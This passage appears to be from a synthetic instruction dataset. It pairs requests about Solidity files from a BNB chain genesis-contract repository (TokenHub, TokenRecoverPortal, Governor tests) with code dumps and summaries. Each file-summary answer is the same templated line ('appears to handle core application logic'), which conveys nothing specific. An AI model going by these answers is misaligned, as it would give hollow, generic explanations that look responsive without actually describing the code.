   revert(\"deprecated\");\n    }\n\n    /**\n     * @dev request a batch cross-chain BNB transfers from BSC to BC\n     *\n     * @param recipientAddrs The destination address of the cross-chain transfer on BC.\n     * @param amounts The amounts to transfer\n     * @param refundAddrs The refund addresses that receive the refund funds while failed to cross-chain transfer\n     * @param expireTime The expire time for these cross-chain transfers\n     */\n    function batchTransferOutBNB(\n        address[] calldata recipientAddrs,\n        uint256[] calldata amounts,\n        address[] calldata refundAddrs,\n        uint64 expireTime\n    ) external payable override onlyInit returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function updateParam(string calldata key, bytes calldata value) external override onlyGov {\n        revert(\"deprecated\");\n    }\n\n    function getContractAddrByBEP2Symbol(bytes32 bep2Symbol) external view override returns (address) {\n        return bep2SymbolToContractAddr[bep2Symbol];\n    }\n\n    function getBep2SymbolByContractAddr(address contractAddr) external view override returns (bytes32) {\n        return contractAddrToBEP2Symbol[contractAddr];\n    }\n\n    function bindToken(bytes32 bep2Symbol, address contractAddr, uint256 decimals) external override onlyTokenManager {\n        revert(\"deprecated\");\n    }\n\n    function unbindToken(bytes32 bep2Symbol, address contractAddr) external override onlyTokenManager {\n        revert(\"deprecated\");\n    }\n\n    function convertFromBep2Amount(uint256 amount, uint256 bep20TokenDecimals) internal pure returns (uint256) {\n        if (bep20TokenDecimals > BEP2_TOKEN_DECIMALS) {\n            return amount.mul(10 ** (bep20TokenDecimals - BEP2_TOKEN_DECIMALS));\n        }\n        return amount.div(10 ** (BEP2_TOKEN_DECIMALS - bep20TokenDecimals));\n    }\n\n    function getBoundContract(string memory bep2Symbol) public view returns (address) {\n        bytes32 bep2TokenSymbol;\n        assembly {\n            bep2TokenSymbol := mload(add(bep2Symbol, 32))\n        }\n        return bep2SymbolToContractAddr[bep2TokenSymbol];\n    }\n\n    function getBoundBep2Symbol(address contractAddr) public view returns (string memory) {\n        bytes32 bep2SymbolBytes32 = contractAddrToBEP2Symbol[contractAddr];\n        bytes memory bep2SymbolBytes = new bytes(32);\n        assembly {\n            mstore(add(bep2SymbolBytes, 32), bep2SymbolBytes32)\n        }\n        uint8 bep2SymbolLength = 0;\n        for (uint8 j = 0; j < 32; ++j) {\n            if (bep2SymbolBytes[j] != 0) {\n                ++bep2SymbolLength;\n            } else {\n                break;\n            }\n        }\n        bytes memory bep2Symbol = new bytes(bep2SymbolLength);\n        for (uint8 j = 0; j < bep2SymbolLength; ++j) {\n            bep2Symbol[j] = bep2SymbolBytes[j];\n        }\n        return string(bep2Symbol);\n    }\n\n    function withdrawStakingBNB(uint256 amount) external override returns (bool) {\n        revert(\"deprecated\");\n    }\n}\n\n```"}
{"instruction": "What does the file TokenHub.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"./interface/0.6.x/IBEP20.sol\";\nimport \"./interface/0.6.x/ITokenHub.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\nimport \"./interface/0.6.x/ISystemReward.sol\";\nimport \"./lib/0.6.x/SafeMath.sol\";\nimport \"./System.sol\";\n\ncontract TokenHub is ITokenHub, System, IParamSubscriber, IApplication, ISystemReward {\n    using SafeMath for uint256;\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    struct LockInfo {\n        uint256 amount;\n        uint256 unlockAt;\n    }\n\n    uint256 public constant MAX_BEP2_TOTAL_SUPPLY = 9000000000000000000;\n    uint8 public constant BEP2_TOKEN_DECIMALS = 8;\n    bytes32 public constant BEP2_TOKEN_SYMBOL_FOR_BNB =\n        0x424E420000000000000000000000000000000000000000000000000000000000; // \"BNB\"\n\n    uint256 public constant INIT_MINIMUM_RELAY_FEE = 2e15;\n    uint256 public constant REWARD_UPPER_LIMIT = 1e18;\n    uint256 public constant TEN_DECIMALS = 1e10;\n    uint256 public constant MAX_GAS_FOR_CALLING_BEP20 = 50000;\n    uint256 public constant MAX_GAS_FOR_TRANSFER_BNB = 10000;\n\n    uint256 public relayFee;\n\n    mapping(address => uint256) public bep20ContractDecimals;\n    mapping(address => bytes32) private contractAddrToBEP2Symbol;\n    mapping(bytes32 => address) private bep2SymbolToContractAddr;\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    // the lock period for large cross-chain transfer\n    uint256 public lockPeriod;  // @dev deprecated\n    // the lock Period for token recover\n    uint256 public constant LOCK_PERIOD_FOR_TOKEN_RECOVER = 7 days;\n    // token address => largeTransferLimit amount, address(0) means BNB\n    mapping(address => uint256) public largeTransferLimitMap;  // @dev deprecated\n    // token address => recipient address => lockedAmount + unlockAt, address(0) means BNB\n    mapping(address => mapping(address => LockInfo)) public lockInfoMap;\n    uint8 internal reentryLock;\n\n    event rewardTo(address to, \n```", "output": "This file `TokenHub.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TokenRecoverPortal.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\TokenRecoverPortal.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./extension/Protectable.sol\";\nimport \"./interface/0.8.x/ITokenHub.sol\";\nimport \"./interface/0.8.x/ITokenRecoverPortal.sol\";\nimport \"./lib/0.8.x/Utils.sol\";\n\n/**\n * @title TokenRecoverPortal is used to recover the token from BC users.\n * @dev This is designed for the BC users to recover the token from TokenHub.\n * The BC chain will stop and generate a merkle tree root after BC-fusion plan was started.\n * The BC users can recover the token from TokenHub after the merkle tree root is generated.\n * For more details, please refer to the BEP-299(https://github.com/bnb-chain/BEPs/pull/299).\n */\ncontract TokenRecoverPortal is SystemV2, Initializable, ReentrancyGuardUpgradeable, Protectable {\n    using Utils for string;\n    using Utils for bytes;\n\n    /*----------------- constants -----------------*/\n    // SOURCE_CHAIN_ID is the original chain ID of BC\n    // This will be replaced based on the deployment network\n    // Mainnet: \"Binance-Chain-Tigris\"\n    // Testnet: \"Binance-Chain-Ganges\"\n    // Rendering script: scripts/generate.py:238\n    string public constant SOURCE_CHAIN_ID = \"Binance-Chain-Ganges\";\n\n    /*----------------- storage -----------------*/\n    address public approvalAddress;\n    bytes32 public merkleRoot;\n    bool public merkleRootAlreadyInit;\n\n    // recoveredMap is used to record the recovered token.\n    mapping(bytes32 => bool) private recoveredMap;\n\n    modifier merkelRootReady() {\n        if (!merkleRootAlreadyInit) revert MerkleRootNotInitialized();\n        if (merkleRoot == bytes32(0)) revert MerkleRootNotInitialized();\n        _;\n    }\n\n    modifier approvalAddressInit() {\n        if (approvalAddress == address(0)) revert ApprovalAddressNotInitialized();\n        _;\n    }\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x3e493100\n    error AlreadyRecovered();\n    // @notice signature: 0x09bde339\n    error InvalidProof();\n    // @notice signature: 0xad60149e\n    error InvalidApprovalSignature();\n    // @notice signature: 0x8152ea1b\n    error InvalidOwnerPubKeyLength();\n    // @notice signature: 0xbc97af2e\n    error InvalidOwnerSignatureLength();\n    // @notice signature: 0xf36660de\n    error MerkleRootAlreadyInitiated();\n    // @notice signature: 0xcf1ec32e\n    error MerkleRootNotInitialized();\n    // @notice signature: 0xc629ac81\n    error TokenRecoverPortalPaused();\n    // @notice signature: 0xd0dcbbd8\n    error ApprovalAddressNotInitialized();\n\n    /*----------------- events -----------------*/\n    // This event is triggered whenever a call to #recover succeeds.\n    event TokenRecoverRequested(bytes ownerAddress, bytes32 tokenSymbol, address account, uint256 amount);\n\n    /*----------------- init -----------------*/\n    function initialize() external initializer onlyCoinbase onlyZeroGasPrice {\n        __ReentrancyGuard_init_unchained();\n\n        // Different address will be set depending on the environment\n        __Protectable_init_unchained(0x08E68Ec70FA3b629784fDB28887e206ce8561E08);\n    }\n\n    /**\n     * isRecovered check if the token is recovered.\n     * @param node the leaf node of merkle tree.\n     * @return the result of check.\n     */\n    function isRecovered(\n        bytes32 node\n    ) public view returns (bool) {\n        return recoveredMap[node];\n    }\n\n    /**\n     * For the Beacon Chain account whose funds are not transferred to BSC before BC fusion,\n     * can still invoke this function to recover funds on the BSC network.\n     * @dev The token will be locked in TokenHub after the signature and the merkel proof is verified.\n     * @notice The token will be unlocked after 7 days.\n     * @param tokenSymbol is the symbol of token.\n     * @param amount is the amount of token.\n     * @param ownerPubKey is the secp256k1 public key of the token owner on BC.\n     * @param ownerSignature is the secp256k1 signature of the token owner on BC.\n     * @param approvalSignature is the eth_secp256k1 signature of the approval.\n     * @param merkleProof is the merkle proof of the token owner on BC.\n     */\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external merkelRootReady approvalAddressInit whenNotPaused nonReentrant {\n        // Recover the owner address and check signature.\n        bytes memory ownerAddr =\n            _verifySecp256k1Sig(ownerPubKey, ownerSignature, _tmSignatureHash(tokenSymbol, amount, msg.sender));\n        // Generate the leaf node of merkle tree.\n        bytes32 node = keccak256(abi.encodePacked(ownerAddr, tokenSymbol, amount));\n\n        // Check if the token is recovered.\n        if (isRecovered(node)) revert AlreadyRecovered();\n\n        // Verify the approval signature.\n        _verifyApprovalSig(msg.sender, ownerSignature, approvalSignature, node, merkleProof);\n\n        // Verify the merkle proof.\n        if (!MerkleProof.verify(merkleProof, merkleRoot, node)) revert InvalidProof();\n\n        // Mark it recovered.\n        recoveredMap[node] = true;\n\n        // recover the token from TokenHub contract. it will be unlocked after 7 days.\n        ITokenHub(TOKEN_HUB_ADDR).recoverBCAsset(tokenSymbol, msg.sender, amount);\n\n        emit TokenRecoverRequested(ownerAddr, tokenSymbol, msg.sender, amount);\n    }\n\n    /**\n     * verifyApprovalSig is used to verify the approval signature.\n     * @dev The signature is generated by the approval address(need to call a token recovery backend service).\n     */\n    function _verifyApprovalSig(\n        address account,\n        bytes memory ownerSignature,\n        bytes memory approvalSignature,\n        bytes32 leafHash,\n        bytes32[] memory merkleProof\n    ) internal view {\n        bytes memory buffer;\n        for (uint256 i = 0; i < merkleProof.length; i++) {\n            buffer = abi.encodePacked(buffer, merkleProof[i]);\n        }\n        // Perform the approvalSignature recovery and ensure the recovered signer is the approval account\n        bytes32 hash =\n            keccak256(abi.encodePacked(SOURCE_CHAIN_ID, account, ownerSignature, leafHash, merkleRoot, buffer));\n\n        if (recover(approvalSignature, hash) != approvalAddress) revert InvalidApprovalSignature();\n    }\n\n    function recover(bytes memory sig, bytes32 hash) internal pure returns (address) {\n        // Ensure the signature length is correct\n        if (sig.length != 65) revert InvalidApprovalSignature();\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n        if (v < 27) v += 27;\n        if (v < 27 || v > 28) revert InvalidApprovalSignature();\n        (address signer,) = ECDSA.tryRecover(hash, v, r, s);\n        return signer;\n    }\n\n    /**\n     * verifySecp256k1Sig is used to verify the secp256k1 signature from BC token owner.\n     * @dev The signature is generated by the token owner by BC tool.\n     */\n    function _verifySecp256k1Sig(\n        bytes memory pubKey,\n        bytes memory signature,\n        bytes32 messageHash\n    ) internal view returns (bytes memory) {\n        // Ensure the public key is valid\n        if (pubKey.length != 33) revert InvalidOwnerPubKeyLength();\n        // Ensure the signature length is correct\n        if (signature.length != 64) revert InvalidOwnerSignatureLength();\n\n        // assemble input data\n        bytes memory msgBz = new bytes(32);\n        assembly {\n            mstore(add(msgBz, 32), messageHash)\n        }\n        bytes memory input = bytes.concat(pubKey, signature, msgBz);\n        bytes memory output = new bytes(20);\n        /* solium-disable-next-line */\n        assembly {\n            // call Secp256k1SignatureRecover precompile contract\n            // Contract address: 0x69\n            // input:\n            // | PubKey | Signature  |  SignatureMsgHash  |\n            // | 33 bytes |  64 bytes    |       32 bytes       |\n            // output:\n            // | recovered address  |\n            // | 20 bytes |\n            let len := mload(input)\n            if iszero(staticcall(not(0), 0x69, add(input, 0x20), len, add(output, 0x20), 20)) { revert(0, 0) }\n        }\n\n        // return the recovered address\n        return output;\n    }\n\n    /**\n     * tmSignatureHash is used to generate the hash of the owner signature.\n     * @dev The hash is used to verify the signature from BC token owner.\n     */\n    function _tmSignatureHash(bytes32 tokenSymbol, uint256 amount, address recipient) internal pure returns (bytes32) {\n        return sha256(\n            abi.encodePacked(\n                '{\"account_number\":\"0\",\"chain_id\":\"',\n                SOURCE_CHAIN_ID,\n                '\",\"data\":null,\"memo\":\"\",\"msgs\":[{\"amount\":\"',\n                Utils.bytesToHex(abi.encodePacked(amount), false),\n                '\",\"recipient\":\"',\n                Utils.bytesToHex(abi.encodePacked(recipient), true),\n                '\",\"token_symbol\":\"',\n                Utils.bytesToHex(abi.encodePacked(tokenSymbol), false),\n                '\"}],\"sequence\":\"0\",\"source\":\"0\"}'\n            )\n        );\n    }\n\n    /**\n     * updateParam is used to update the parameters of TokenRecoverPortal.\n     * @dev The parameters can only be updated by the governor.\n     * @param key is the key of the parameter.\n     * @param value is the value of the parameter.\n     */\n    function updateParam(string calldata key, bytes calldata value) external onlyGov {\n        if (key.compareStrings(\"approvalAddress\")) {\n            if (value.length != 20) revert InvalidValue(key, value);\n            address newApprovalAddress = value.bytesToAddress(20);\n            if (newApprovalAddress == address(0)) revert InvalidValue(key, value);\n            approvalAddress = newApprovalAddress;\n        } else if (key.compareStrings(\"merkleRoot\")) {\n            if (merkleRootAlreadyInit) revert MerkleRootAlreadyInitiated();\n            if (value.length != 32) revert InvalidValue(key, value);\n            bytes32 newMerkleRoot = value.bytesToBytes32(32);\n            if (newMerkleRoot == bytes32(0)) revert InvalidValue(key, value);\n            merkleRoot = newMerkleRoot;\n            merkleRootAlreadyInit = true;\n        } else if (key.compareStrings(\"tokenRecoverPortalProtector\")) {\n            if (value.length != 20) revert InvalidValue(key, value);\n            address newTokenRecoverPortalProtector = value.bytesToAddress(20);\n            if (newTokenRecoverPortalProtector == address(0)) revert InvalidValue(key, value);\n            _setProtector(newTokenRecoverPortalProtector);\n        } else {\n            revert UnknownParam(key, value);\n        }\n        emit ParamChange(key, value);\n    }\n\n    /**\n     * cancelTokenRecover is used to cancel the recovery request.\n     * @dev The token recover request can only be canceled by the assetProtector.\n     * @param tokenSymbol is the symbol of token.\n     * @param attacker is the address of the attacker.\n     */\n    function cancelTokenRecover(bytes32 tokenSymbol, address attacker) external onlyProtector {\n        ITokenHub(TOKEN_HUB_ADDR).cancelTokenRecoverLock(tokenSymbol, attacker);\n    }\n}\n\n```"}
{"instruction": "What does the file TokenRecoverPortal.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./extension/Protectable.sol\";\nimport \"./interface/0.8.x/ITokenHub.sol\";\nimport \"./interface/0.8.x/ITokenRecoverPortal.sol\";\nimport \"./lib/0.8.x/Utils.sol\";\n\n/**\n * @title TokenRecoverPortal is used to recover the token from BC users.\n * @dev This is designed for the BC users to recover the token from TokenHub.\n * The BC chain will stop and generate a merkle tree root after BC-fusion plan was started.\n * The BC users can recover the token from TokenHub after the merkle tree root is generated.\n * For more details, please refer to the BEP-299(https://github.com/bnb-chain/BEPs/pull/299).\n */\ncontract TokenRecoverPortal is SystemV2, Initializable, ReentrancyGuardUpgradeable, Protectable {\n    using Utils for string;\n    using Utils for bytes;\n\n    /*----------------- constants -----------------*/\n    // SOURCE_CHAIN_ID is the original chain ID of BC\n    // This will be replaced based on the deployment network\n    // Mainnet: \"Binance-Chain-Tigris\"\n    // Testnet: \"Binance-Chain-Ganges\"\n    // Rendering script: scripts/generate.py:238\n    string public constant SOURCE_CHAIN_ID = \"Binance-Chain-Ganges\";\n\n    /*----------------- storage -----------------*/\n    address public approvalAddress;\n    bytes32 public merkleRoot;\n    bool public merkleRootAlreadyInit;\n\n    // recoveredMap is used to record the recovered token.\n    mapping(bytes32 => bool) private recoveredMap;\n\n    modifier merkelRootReady() {\n        if (!merkleRootAlreadyInit) revert MerkleRootNotInitialized();\n        if (merkleRoot == bytes32(0)) revert MerkleRootNotInitialized();\n        _;\n    }\n\n    modifier approvalAddressInit() {\n        if (approvalAddress == address(0)) revert ApprovalAdd\n```", "output": "This file `TokenRecoverPortal.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Governor.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\Governor.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport \"./utils/Deployer.sol\";\n\ninterface IStakeCredit {\n    function balanceOf(address account) external view returns (uint256);\n    function totalPooledBNB() external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n}\n\ncontract GovernorTest is Deployer {\n    using RLPEncode for *;\n\n    event ConsensusAddressEdited(address indexed operatorAddress, address indexed newAddress);\n    event CommissionRateEdited(address indexed operatorAddress, uint64 commissionRate);\n    event DescriptionEdited(address indexed operatorAddress);\n    event VoteAddressEdited(address indexed operatorAddress, bytes newVoteAddress);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event ValidatorSlashed(address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, uint8 slashType);\n    event ValidatorUnjailed(address indexed operatorAddress);\n    event Claimed(address indexed operatorAddress, address indexed delegator, uint256 bnbAmount);\n\n    receive() external payable { }\n\n    function setUp() public {\n        vm.mockCall(address(0x66), bytes(\"\"), hex\"01\");\n    }\n\n    function testDelegateVote() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n\n        // success case\n        uint256 bnbAmount = 100 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, bnbAmount);\n\n        uint256 govBNBBalance = govToken.balanceOf(delegator);\n        assertEq(govBNBBalance, bnbAmount);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToken.delegate(delegator);\n        assertEq(govToken.getVotes(delegator), govBNBBalance);\n\n        address user2 = _getNextUserAddress();\n        govToken.delegate(user2);\n        assertEq(govToken.getVotes(delegator), 0);\n        assertEq(govToken.getVotes(user2), govBNBBalance);\n\n        vm.stopPrank();\n    }\n\n    function testProposeErrorCase() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n        assert(governor.proposeStarted());\n        vm.deal(delegator, 20_000_000 ether);\n        uint256 bnbAmount = 10_000_000 ether - 2000 ether - 1 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, bnbAmount);\n\n        uint256 govBNBBalance = govToken.balanceOf(delegator);\n        assertEq(govBNBBalance, bnbAmount);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToken.delegate(delegator);\n        assertEq(govToken.getVotes(delegator), govBNBBalance);\n        console2.log(\"govBNBBalance\", govBNBBalance);\n\n        // text Propose\n        address[] memory targets;\n        uint256[] memory values;\n        bytes[] memory calldatas;\n\n        vm.roll(block.number + 1);\n\n        // param proposal\n        targets = new address[](1);\n        targets[0] = GOV_HUB_ADDR;\n        values = new uint256[](1);\n        values[0] = 0;\n        calldatas = new bytes[](1);\n\n        uint256 newVotingDelay = 7;\n        calldatas[0] = abi.encodeWithSignature(\n            \"updateParam(string,bytes,address)\", \"votingDelay\", abi.encodePacked(newVotingDelay), GOVERNOR_ADDR\n        );\n\n        //        assertEq(governor.proposeStarted(), true, \"propose should not start\");\n\n        // mainnet totalSupply is already enough\n        // // govBNB totalSupply not enough\n        // string memory description = \"test\";\n        // vm.expectRevert();\n        // uint256 proposalId = governor.propose(targets, values, calldatas, description);\n        // assertEq(governor.proposeStarted(), false, \"propose should not start\");\n        //\n        // bnbAmount = 1 ether;\n        // stakeHub.delegate{ value: bnbAmount }(validator, false);\n        // proposalId = governor.propose(targets, values, calldatas, description);\n        // assertEq(governor.proposeStarted(), true, \"propose should start\");\n        //\n        // bnbAmount = 10000000 ether - 2000 ether;\n        // govBNBBalance = govToken.balanceOf(delegator);\n        // console2.log(\"govBNBBalance\", govBNBBalance);\n        // assertEq(govBNBBalance, bnbAmount);\n        // assertEq(govToken.getVotes(delegator), govBNBBalance);\n        // console2.log(\"voting power before undelegate\", govToken.getVotes(delegator));\n\n        // voting power changed after undelegating staking share\n        bnbAmount = 1 ether;\n        stakeHub.undelegate(validator, bnbAmount);\n        console2.log(\"voting power after undelegate\", govToken.getVotes(delegator));\n        assertEq(govToken.getVotes(delegator), govBNBBalance - bnbAmount);\n    }\n\n    function testProposalNotApproved() public {\n        address delegator = _getNextUserAddress();\n        (address validator,,,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n        assert(governor.proposeStarted());\n        vm.deal(delegator, 20_000_000 ether);\n        uint256 bnbAmount = 10_000_000 ether - 2000 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToken.delegate(delegator);\n        assertEq(govToken.getVotes(delegator), bnbAmount);\n        console2.log(\"govToken.getVotes(delegator)\", govToken.getVotes(delegator));\n\n        address delegator2 = _getNextUserAddress();\n        vm.startPrank(delegator2);\n        vm.deal(delegator2, 20_000_000 ether);\n        bnbAmount = 10_000_000 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n\n        assertEq(govToken.getVotes(delegator2), 0);\n        govToken.delegate(delegator2);\n        assertEq(govToken.getVotes(delegator2), bnbAmount);\n        console2.log(\"govToken.getVotes(delegator2)\", govToken.getVotes(delegator2));\n        vm.stopPrank();\n\n        // text Propose\n        vm.startPrank(delegator);\n        address[] memory targets = new address[](1);\n        targets[0] = GOV_HUB_ADDR;\n        uint256[] memory values = new uint256[](1);\n        bytes[] memory calldatas = new bytes[](1);\n        string memory description = \"test\";\n\n        vm.roll(block.number + 1);\n        uint256 proposalId = governor.propose(targets, values, calldatas, description);\n\n        uint256 _nowBlock = block.number;\n        uint256 _now = block.timestamp;\n        vm.roll(_nowBlock + 1);\n        vm.warp(_now + 3);\n        // support vote\n        governor.castVote(proposalId, 1);\n        vm.stopPrank();\n\n        vm.startPrank(delegator2);\n        // against vote\n        governor.castVote(proposalId, 0);\n        vm.stopPrank();\n\n        uint256 deadline = governor.proposalDeadline(proposalId);\n        vm.roll(deadline + 1);\n\n        // against > support\n        vm.expectRevert(\"Governor: proposal not successful\");\n        governor.queue(proposalId);\n    }\n\n    function testProposalQuorumNotReached() public {\n        address delegator = _getNextUserAddress();\n        (address validator,,,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n        assert(governor.proposeStarted());\n        vm.deal(delegator, 20_000_000 ether);\n        uint256 bnbAmount = 10_000_000 ether - 2000 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToken.delegate(delegator);\n        assertEq(govToken.getVotes(delegator), bnbAmount);\n        console2.log(\"govToken.getVotes(delegator)\", govToken.getVotes(delegator));\n\n        address delegator2 = _getNextUserAddress();\n        vm.startPrank(delegator2);\n        vm.deal(delegator2, 20_000_000 ether);\n        bnbAmount = bnbAmount / 10;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n\n        assertEq(govToken.getVotes(delegator2), 0);\n        govToken.delegate(delegator2);\n        assertEq(govToken.getVotes(delegator2), bnbAmount);\n        console2.log(\"govToken.getVotes(delegator2)\", govToken.getVotes(delegator2));\n        vm.stopPrank();\n\n        // text Propose\n        vm.startPrank(delegator);\n        address[] memory targets = new address[](1);\n        targets[0] = GOV_HUB_ADDR;\n        uint256[] memory values = new uint256[](1);\n        bytes[] memory calldatas = new bytes[](1);\n        string memory description = \"test\";\n\n        vm.roll(block.number + 1);\n        uint256 proposalId = governor.propose(targets, values, calldatas, description);\n\n        uint256 _nowBlock = block.number;\n        uint256 _now = block.timestamp;\n        vm.roll(_nowBlock + 1);\n        vm.warp(_now + 3);\n        vm.stopPrank();\n\n        vm.startPrank(delegator2);\n        // support vote, support quorum < 10%\n        governor.castVote(proposalId, 1);\n        vm.stopPrank();\n\n        uint256 deadline = governor.proposalDeadline(proposalId);\n        vm.roll(deadline + 1);\n\n        // quorum not reached\n        uint256 quorumVote = governor.quorumVotes();\n\n        (,,,,, uint256 forVotes, uint256 againstVotes,,,) = governor.proposals(proposalId);\n\n        console2.log(\"quorumVote\", quorumVote);\n        console2.log(\"forVotes\", forVotes);\n        console2.log(\"againstVotes\", againstVotes);\n\n        assertEq(forVotes < quorumVote, true, \"quorum not reached\");\n\n        vm.expectRevert(\"Governor: proposal not successful\");\n        governor.queue(proposalId);\n    }\n\n    function testProposeQuorumReached() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n        assert(governor.proposeStarted());\n\n        vm.deal(delegator, 20_000_000 ether);\n\n        uint256 bnbAmount = 10_000_000 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, bnbAmount);\n\n        uint256 govBNBBalance = govToken.balanceOf(delegator);\n        assertEq(govBNBBalance, bnbAmount);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToken.delegate(delegator);\n        assertEq(govToken.getVotes(delegator), govBNBBalance);\n\n        // text Propose\n        address[] memory targets;\n        uint256[] memory values;\n        bytes[] memory calldatas;\n        string memory description = \"test\";\n\n        vm.roll(block.number + 1);\n        console2.log(\"delegator\", delegator);\n        console2.log(\"govToken.getVotes(delegator)\", govToken.getVotes(delegator));\n\n        // param proposal\n        targets = new address[](1);\n        targets[0] = GOV_HUB_ADDR;\n        values = new uint256[](1);\n        values[0] = 0;\n        calldatas = new bytes[](1);\n\n        uint256 newVotingDelay = 7;\n        calldatas[0] = abi.encodeWithSignature(\n            \"updateParam(string,bytes,address)\", \"votingDelay\", abi.encodePacked(newVotingDelay), GOVERNOR_ADDR\n        );\n\n        uint256 proposalId = governor.propose(targets, values, calldatas, description);\n        assertEq(governor.proposeStarted(), true, \"propose should start\");\n\n        bytes32 descHash = keccak256(bytes(description));\n        console2.logBytes32(descHash);\n        assertEq(proposalId, governor.hashProposal(targets, values, calldatas, descHash), \"hashProposal\");\n\n        console2.log(\"proposalId\", proposalId);\n        console2.log(\"proposalSnapshot\", governor.proposalSnapshot(proposalId));\n        console2.log(\"now\", governor.clock());\n\n        uint256 _nowBlock = block.number;\n        uint256 _now = block.timestamp;\n\n        uint256 BLOCK_INTERVAL = 3 seconds;\n        uint256 INIT_VOTING_PERIOD = 7 days / BLOCK_INTERVAL;\n        uint256 NEW_VOTING_PERIOD = INIT_VOTING_PERIOD * 4;\n        uint64 INIT_MIN_PERIOD_AFTER_QUORUM = uint64(1 days / BLOCK_INTERVAL);\n        uint64 NEW_MIN_PERIOD_AFTER_QUORUM = INIT_MIN_PERIOD_AFTER_QUORUM * 4;\n        vm.roll(_nowBlock + NEW_VOTING_PERIOD - 1);\n        vm.warp(_now + (NEW_VOTING_PERIOD - 1) * BLOCK_INTERVAL / 2);\n\n        uint256 deadline = governor.proposalDeadline(proposalId);\n        console2.log(\"block.number\", block.number);\n        console2.log(\"deadline block\", deadline);\n        assertEq(deadline, block.number + 1);\n\n        governor.castVote(proposalId, 1);\n\n        deadline = governor.proposalDeadline(proposalId);\n        console2.log(\"block.number\", block.number);\n        console2.log(\"deadline block\", deadline);\n        // quorum reached, deadline should be added 1 day\n        assertEq(deadline, block.number + NEW_MIN_PERIOD_AFTER_QUORUM);\n    }\n\n    function testPropose() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n        assert(governor.proposeStarted());\n\n        vm.deal(delegator, 20_000_000 ether);\n\n        uint256 bnbAmount = 10_000_000 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, bnbAmount);\n\n        uint256 govBNBBalance = govToken.balanceOf(delegator);\n        assertEq(govBNBBalance, bnbAmount);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToken.delegate(delegator);\n        assertEq(govToken.getVotes(delegator), govBNBBalance);\n\n        // text Propose\n        address[] memory targets;\n        uint256[] memory values;\n        bytes[] memory calldatas;\n        string memory description = \"test\";\n\n        vm.roll(block.number + 1);\n        console2.log(\"delegator\", delegator);\n        console2.log(\"govToken.getVotes(delegator)\", govToken.getVotes(delegator));\n\n        // param proposal\n        targets = new address[](1);\n        targets[0] = GOV_HUB_ADDR;\n        values = new uint256[](1);\n        values[0] = 0;\n        calldatas = new bytes[](1);\n\n        uint256 newVotingDelay = 7;\n        calldatas[0] = abi.encodeWithSignature(\n            \"updateParam(string,bytes,address)\", \"votingDelay\", 